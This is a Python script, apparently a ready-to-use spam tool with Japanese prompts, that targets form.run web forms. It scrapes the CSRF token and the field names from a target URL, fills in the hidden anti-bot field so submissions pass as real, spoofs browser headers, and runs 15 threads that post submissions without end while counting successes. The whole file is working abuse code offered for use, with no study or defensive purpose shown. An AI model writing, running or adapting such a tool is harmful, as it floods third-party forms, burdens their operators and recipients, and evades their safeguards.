import sys
import requests
from bs4 import BeautifulSoup
import re
import json
import time
import random
import threading
from requests_toolbelt import MultipartEncoder
import string

success = 0
failed = 0

class FormrunSpammer():
    
    def __init__(self, url, proxies=None):
        self.url = url
        self.proxies = proxies
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': '*/*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript',
            'Accept-Language': 'ja,en-US;q=0.7,en;q=0.3',
            'Referer': 'https://google.com',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://form.run',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Connection': 'keep-alive',
        }
    
    def get_token(self):
        res = requests.get(self.url).text
        soup = BeautifulSoup(res, "html.parser")
        token = soup.find("meta", attrs={"name": "csrf-token"})["content"]
        return token
    
    def get_info(self):
        response = requests.get(self.url)
        result = response.text.replace("&quot;", '"').replace("&lt;", "<").replace("&gt;", ">")
        table_list = re.findall(r'{"id":[0-9]+,"name":"_field_[0-9]+","label":".{0,25}"', result)
        
        result = []
        for table in table_list:
            table_dict = ",".join(table.split(",")[:2]) + "}"
            table_dict = json.loads(table_dict)
            result.append(table_dict)
        
        return result

    def spam(self, send_data):
        global success
        global failed
        
        while True:
            send_data["authenticity_token"] = self.get_token()
            send_data["_formrun_gotcha"] = ""
            boundary = '----WebKitFormBoundary' + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
            self.headers['Content-Type'] =  'multipart/form-data; boundary=' + boundary
            data = MultipartEncoder(fields=send_data, boundary=boundary)

            response = requests.post(self.url, data=data, headers=self.headers)
            if response.status_code == 201:
                success += 1

            else:
                failed += 1

def printer():
    while True:
        print("Success:", success, "\nFailed", failed)
        time.sleep(1)

if __name__ == "__main__":
    print("ターゲットのURLを入力してください")
    url = input()
    fm = FormrunSpammer(url)
    
    send_data = {}
    try:
        for table in fm.get_info():
            name = table["name"]
            label = table["label"]
            print(label, "として送信する値を入力してください。")
            data = input()
            send_data.update({name: data})
    except:
        print("フォームの取得に失敗しました。情報が正しいかどうか確認してください。")
        sys.exit(1)
    
    if send_data == {}:
        print("フォームの取得に失敗しました。情報が正しいかどうか確認してください。")
        sys.exit(1)
    print(send_data, "で送信します。")
    
    threading.Thread(target=printer).start()
    for _ in range(0, 15):
        threading.Thread(target=fm.spam, args=(send_data, )).start()
        time.sleep(0.4)
